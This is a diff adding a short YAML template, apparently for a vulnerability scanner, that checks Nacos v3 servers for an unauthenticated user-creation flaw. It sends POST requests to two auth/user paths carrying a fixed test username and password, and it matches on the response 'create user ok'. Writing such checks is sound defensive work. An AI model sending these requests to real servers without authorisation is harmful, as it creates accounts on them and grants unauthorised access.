@@ -1,0 +1,17 @@
+name: nacos-v3-unauthorized
+groups:
+  path1:
+    - method: POST
+      path: "/nacos/v3/auth/user?username=testuser&password=Qwer43211234!"
+      expression: |
+        response.status == 200 && response.body.bcontains(b"create user ok")
+  path2:
+    - method: POST
+      path: "/v3/auth/user?username=testuser&password=Qwer43211234!"
+      expression: |
+        response.status == 200 && response.body.bcontains(b"create user ok")
+detail:
+  author: lxy
+  links:
+    - https://nacos.io/en/docs/v3/open-api/
+  description: "Nacos V3 未授权用户创建漏洞"
